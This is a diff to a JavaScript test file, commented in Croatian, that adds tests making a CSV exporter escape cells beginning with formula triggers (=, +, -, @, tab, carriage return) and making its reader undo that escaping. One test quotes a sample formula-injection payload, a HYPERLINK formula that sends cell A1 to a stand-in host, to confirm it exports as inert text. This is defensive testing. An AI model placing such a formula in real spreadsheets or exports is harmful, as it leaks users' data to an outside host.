@@ -85,6 +85,37 @@ describe("toCsv", () => {
   });
 });
 
+describe("toCsv — formule", () => {
+  // Bez ovoga tablični program izvrši ćeliju koju je napisao administrator.
+  it("označava tekstom svaki okidač formule", () => {
+    for (const v of ["=1+1", "+1", "-1", "@SUM(A1)"]) {
+      expect(toCsv([[v]], ";")).toBe(`${P(";")}'${v}`);
+    }
+  });
+
+  it("TAB i CR su okidači jednako kao = + - @", () => {
+    expect(toCsv([["\tX"]], ";")).toBe(`${P(";")}'\tX`);
+    // CR povlači i navodnike, ali oni sami ne bi zaustavili izvršavanje.
+    expect(toCsv([["\rX"]], ";")).toBe(`${P(";")}"'\rX"`);
+  });
+
+  it("okidač usred teksta nije okidač", () => {
+    expect(toCsv([["Ana=Ana", "1+1", "a@b.hr"]], ";")).toBe(
+      `${P(";")}Ana=Ana;1+1;a@b.hr`,
+    );
+  });
+
+  it("HYPERLINK napad iz sigurnosnog pregleda izlazi kao tekst", () => {
+    const attack = '=HYPERLINK("https://evil.example/?d="&A1,"Rezultati")';
+    const body = toCsv([[attack]], ";").slice(P(";").length);
+    expect(body.startsWith("\"'=")).toBe(true);
+  });
+
+  it("prazna ćelija i sam apostrof prolaze netaknuti", () => {
+    expect(toCsv([["", "'"]], ";")).toBe(`${P(";")};'`);
+  });
+});
+
 describe("csvDate", () => {
   it("daje ISO datum bez vremena", () => {
     expect(csvDate(new Date("2026-07-25T22:13:00.000Z"))).toBe("2026-07-25");
@@ -268,10 +299,20 @@ describe("readCsv", () => {
       ["Ime", "Prezime", "E-mail"],
       ["Kovačević, Ana", 'Ana ""', "ana@unizg.hr"],
       ["prvi\ndrugi", "", "b@c.hr"],
+      // Oznaka teksta ispred formule mora se skinuti pri čitanju, inače se
+      // vlastiti izvoz ne može ponovno uvesti u čarobnjak.
+      ["=Ana", "-Horvat", "@b.hr"],
+      ["\tX", "'", "1+1"],
     ];
     for (const d of [";", ","]) {
       expect(readCsv(toCsv(rows, d))).toEqual(rows);
     }
+  });
+
+  it("miče oznaku teksta samo ispred okidača formule", () => {
+    expect(readCsv("'=Ana;'-1;'Ante;a'b")).toEqual([
+      ["=Ana", "-1", "'Ante", "a'b"],
+    ]);
   });
 });
 
